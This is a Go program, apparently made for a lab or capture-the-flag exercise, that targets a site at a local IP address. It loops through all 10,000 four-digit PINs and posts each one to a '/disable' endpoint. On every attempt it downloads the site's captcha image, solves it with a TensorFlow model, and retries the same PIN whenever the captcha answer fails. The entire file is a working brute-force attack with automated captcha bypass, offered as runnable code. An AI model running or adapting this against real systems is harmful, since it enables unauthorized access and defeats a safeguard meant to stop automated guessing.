package main

import (
	"bytes"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"

	tf "github.com/tensorflow/tensorflow/tensorflow/go"
)

const (
	siteUrl    = "http://192.168.0.13:5000"
	badPIN     = "Incorrect PIN"
	badCaptcha = "Incorrect captcha"
)

func logIntoSite(pinAttempt string, savedModel *tf.SavedModel, printLogs bool) {
	// open cookiejar
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatal(err)
	}
	client := &http.Client{
		Jar: jar,
	}

	// read captcha
	captchaUrl := siteUrl + "/captcha.png"
	captchaImage, err := client.Get(captchaUrl)
	if err != nil {
		log.Fatal(err)
	}
	defer captchaImage.Body.Close()

	buf := new(bytes.Buffer)
	buf.ReadFrom(captchaImage.Body)

	// run captcha through tensorflow model
	feedsOutput := tf.Output{
		Op:    savedModel.Graph.Operation("CAPTCHA/input_image_as_bytes"),
		Index: 0,
	}
	feedsTensor, err := tf.NewTensor(string(buf.String()))
	if err != nil {
		log.Fatal(err)
	}
	feeds := map[tf.Output]*tf.Tensor{feedsOutput: feedsTensor}

	fetches := []tf.Output{
		{
			Op:    savedModel.Graph.Operation("CAPTCHA/prediction"),
			Index: 0,
		},
	}

	captchaText, err := savedModel.Session.Run(feeds, fetches, nil)
	if err != nil {
		log.Fatal(err)
	}
	captchaString := captchaText[0].Value().(string)

	// try to log in
	params := url.Values{}
	params.Set("pin", pinAttempt)
	params.Set("captcha", captchaString)

	res, err := client.PostForm(string(siteUrl+"/disable"), params)
	if err != nil {
		log.Fatal(err)
	}

	defer res.Body.Close()
	buf = new(bytes.Buffer)
	buf.ReadFrom(res.Body)
	response := buf.String()

	// if bad captcha - retry with same PIN
	if parseResponse(response, pinAttempt, captchaString, printLogs) == badCaptcha {
		logIntoSite(pinAttempt, savedModel, printLogs)
	}
	return
}

func parseResponse(response, pinAttempt, captchaString string, printLogs bool) string {
	message := "something happened"
	if strings.Contains(response, badPIN) {
		message = badPIN
	} else if strings.Contains(response, badCaptcha) {
		message = badCaptcha
	}

	logResponse(printLogs, message, pinAttempt, captchaString, response)
	return message
}

func logResponse(printLogs bool, message, pin, captcha, response string) {
	if message == "something happened" {
		log.Println(message + " for PIN: " + pin + " response is: " + response)
		fmt.Println(message + "Something happened for PIN: " + pin + " response is: " + response)
		return
	}

	if printLogs {
		fmt.Println(message + " for PIN: " + pin + " captcha: " + captcha)
	}
	log.Println(message + " for PIN: " + pin + " captcha: " + captcha)
	return
}

func main() {
	printLogs := flag.Bool("printlog", false, "set to true for printing all log lines on the screen")
	flag.Parse()

	// always make a log file
	logfile, err := os.OpenFile("run.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("error opening a log file: %v", err)
	}
	defer logfile.Close()
	log.SetOutput(logfile)

	// load tensorflow model
	savedModel, err := tf.LoadSavedModel("./tensorflow_savedmodel_captcha", []string{"serve"}, nil)
	if err != nil {
		log.Println("failed to load model", err)
		return
	}
	// iterate
	for x := 0; x < 10000; x++ {
		logIntoSite(fmt.Sprintf("%0.4d", x), savedModel, *printLogs)
	}
}
